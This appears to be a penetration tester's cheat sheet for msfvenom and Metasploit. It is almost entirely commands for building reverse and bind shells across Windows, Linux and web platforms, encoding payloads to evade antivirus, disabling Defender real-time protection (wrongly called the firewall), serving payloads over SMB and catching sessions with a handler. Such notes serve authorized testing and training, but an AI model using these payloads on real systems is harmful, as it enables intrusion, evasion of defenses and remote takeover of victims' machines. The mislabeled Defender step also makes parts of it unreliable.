# Msfvenom

Msfvenom is a Metasploit tool for creating custom payloads that can be executed on the victim machine.


To display available payloads:

```shell
msfvenom -l payloads 
```

## Types:
- Staged: Sends malicious code in multiple stages to avoid detection. Sometimes can't be used with msfvenom directly, but with Metasploit.

- Stageless: Sends the entire code at once. May be detected, but can be used with msfvenom.

To view options for a specific payload, use the `-p` option followed by `--list-options`:

```shell
msfvenom -p windows/adduser --list-options
```

Use the `-f` option to specify the output format:

```shell
msfvenom -p windows/adduser -f exe -o adduser.exe
```

Disable Windows Firewall on the victim machine with:

```shell
Set-MpPreference -disableRealtimeMonitoring $true
```

Share the file using "impacket-smbserver", sharing the current directory:

```shell
impacket-smbserver share ./
```
If connection fails, try forcing username and password:

```shell
impacket-smbserver share ./ -smb2support -username test -password test
```

Connect from Windows using the run dialog:

```shell 
\\<ip kali>\share
```



## Stageless reverse shell for Windows

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=8001 -f exe -o shellp8001.exe
```

Listen on Kali with netcat:

```shell
nc -lvnp 8001
```

## Additional examples

```shell
# Create a payload
msfvenom -p [payload] LHOST=[IPAtacante] LPORT=[PuertoEscucha]

# List payloads
msfvenom -l payloads

# List payload options
msfvenom -p [payload] --list-options
msfvenom -p windows/x64/meterpreter_reverse_tcp --list-options

# Create an encoded payload
msfvenom -p [payload] -e [encoder] -f [FormatoSalida] -i [iteraciÃ³n]  > ArchivoResultante

# Create a payload using a template
msfvenom -p [payload]  -x [Plantilla] -f [FormatoSalida] > ArchivoResultante

# Listen for payloads in Metasploit:
msf6>use exploit/multi/handler
msf6>set payload windows/meterpreter/reverse_tcp
msf6>set lhost [IP]
msf6>set lport  [Puerto]
msf6> set ExitOnSession false
msf6>exploit -j

#  Windows payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f exe > shell.exe

msfvenom -p windows/meterpreter_reverse_http LHOST=[IPAtacante] LPORT=[PuertoEscucha] HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe

msfvenom -p windows/meterpreter/bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f exe > shell.exe

msfvenom -p windows/shell/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f exe > shell.exe

msfvenom -p windows/shell_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f exe > shell.exe



#  Linux payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f elf > shell.elf

msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf

msfvenom -p linux/x64/shell_bind_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf

msfvenom -p linux/x64/shell_reverse_tcp RHOST=[IPRemota] LPORT=[PuertoEscucha] -f elf > shell.elf


# Add a user in windows with msfvenom:
msfvenom -p windows/adduser USER=[usuario] PASS=[password] -f exe > adduser.exe

#  Generate Web Payloads

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.php
cat shell.php | pbcopy && echo shell.php && pbpaste >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f war > shell.war


#  Script format payloads
# Python
msfvenom -p cmd/unix/reverse_python LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f raw > shell.pl

# Create an encoded payload removing bad characters:
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=[IPAtacante] LPORT=[PuertoEscucha] -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
```